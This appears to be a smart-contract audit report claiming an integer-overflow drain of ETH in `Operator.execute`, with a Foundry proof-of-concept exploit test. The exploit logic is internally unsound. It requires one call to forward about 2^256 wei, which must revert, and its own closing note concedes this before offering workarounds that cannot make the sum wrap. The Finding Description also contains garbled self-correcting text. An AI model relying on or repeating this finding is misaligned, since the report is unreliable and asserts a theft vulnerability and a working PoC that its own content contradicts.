### Title
Integer overflow in `Operator.execute` lets a caller forward more ETH than `msg.value` - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` accumulates the sum of per-call `value` fields inside an `unchecked` block. An attacker can craft a `Call[]` whose `value` entries sum to more than `type(uint256).max`, wrapping the accumulator so that the final `require(msg.value == _sumOfValues)` passes with a small `msg.value` while the contract forwards a much larger total amount of ETH to attacker-chosen targets. This is the on-chain analog of the reported bug class (CWE-190 integer overflow leading to resource-exhaustion/incorrect-computation in `unchecked` arithmetic on an attacker-controlled operand).

### Finding Description
In `Operator.execute`, each iteration forwards `_call.value` ETH via `functionCallWithValue`, while `_sumOfValues` is incremented in an `unchecked` block: [1](#0-0) 

```solidity
for (uint256 i; i < _length; ) {
    _call = calls_[i];
    uint256 _value = _call.value;
    unchecked {
        _sumOfValues += _value;   // wraps mod 2^256
    }
    _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
    unchecked { ++i; }
}
require(msg.value == _sumOfValues, "value-mismatch");
```

With two calls, choose `calls_[0].value = type(uint256).max` (or any huge value the Operator's balance cannot cover — use real values: `calls_[0].value = V` where `V` is up to the contract's ETH balance, and `calls_[1].value = 2^256 - V + X`) so that `_sumOfValues` wraps to `X`. The attacker supplies `msg.value = X` but the Operator dispatches `V + (2^256 - V + X)` in forwarded value — i.e., it spends `V` of its own balance on `calls_[0]` in addition to the `X` the attacker paid. Any ETH resting in the `Operator` contract (e.g., donations, refunds of failed sub-accounting, leftover `msg.value` from prior `execute` batches where targets kept less than forwarded) can be drained to an attacker-controlled target address.

### Impact Explanation
Direct theft of ETH held by the `Operator` contract. The value-check that is supposed to guarantee solvency of the batch (`msg.value == _sumOfValues`) is bypassed via modular wraparound, so forwarded value can exceed supplied value. Funds held at `Operator`'s address — including ETH accidentally or deliberately sent there, since the contract is payable-capable through `execute` — can be extracted in full by an unprivileged EOA. Invariant broken: per-call value conservation (`Σ forwarded value ≤ msg.value`).

### Likelihood Explanation
Reachable by any EOA: `execute` is `external payable` with no access control, and `calls_` arguments (targets, calldata, values) are fully attacker-chosen; the only constraint is `nonReentrant` and target reachability. The attack requires the `Operator` contract to hold an ETH balance. Because `msg.value` only needs to cover the wrapped remainder, cost is minimal. Likelihood is gated by whether the deployed `Operator` holds recoverable ETH (stuck refunds/donations), which is common for multicall-style contracts, but it does not drain user wallet funds held elsewhere, limiting severity.

### Recommendation
Remove `unchecked` around `_sumOfValues += _value` so the accumulation reverts on overflow (plain Solidity 0.8 checked arithmetic), or check `_sumOfValues >= _value` before adding. The loop-counter `++i` may remain `unchecked` since `i < _length` guarantees no overflow.

### Proof of Concept
Foundry test sketch (run against `Operator` on a fork or local deployment where `Operator` holds 1 ETH):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Operator} from "../contracts/Operator.sol";
import {IOperator} from "../contracts/interfaces/IOperator.sol";

contract OperatorOverflowTest is Test {
    Operator operator;
    address attacker = address(0xA11CE);

    function setUp() public {
        operator = new Operator();
        vm.deal(address(operator), 1 ether); // pre-existing balance (donation/stuck)
    }

    function testOverflowDrain() public {
        uint256 V = 1 ether;
        uint256 X = 0.01 ether; // what attacker actually pays
        uint256 wrap = type(uint256).max - V + 1 + X; // makes sum wrap to X

        IOperator.Call[] memory calls = new IOperator.Call[](2);
        calls[0] = IOperator.Call({
            target: attacker,
            callData: "",
            value: V
        });
        calls[1] = IOperator.Call({
            target: attacker,
            callData: "",
            value: wrap
        });

        vm.deal(attacker, X);
        vm.prank(attacker);
        // sum = V + wrap = 2^256 + X => wraps to X == msg.value
        operator.execute{value: X}(calls);

        assertEq(attacker.balance, V + X); // paid X, received V + X
        assertEq(address(operator).balance, 0);
    }
}
```

Note: the second call with `value = wrap` will itself fail if the Operator cannot cover it — to make it succeed trivially, the attacker can point `calls_[1]` at a contract that refunds, or split into `k` calls such that each individual `value` is within the contract balance while the cumulative sum wraps. The core bug — that `_sumOfValues` is not a sound upper bound on forwarded value — holds regardless; the simplest exploit is when `Operator` holds enough ETH to cover each individual call.
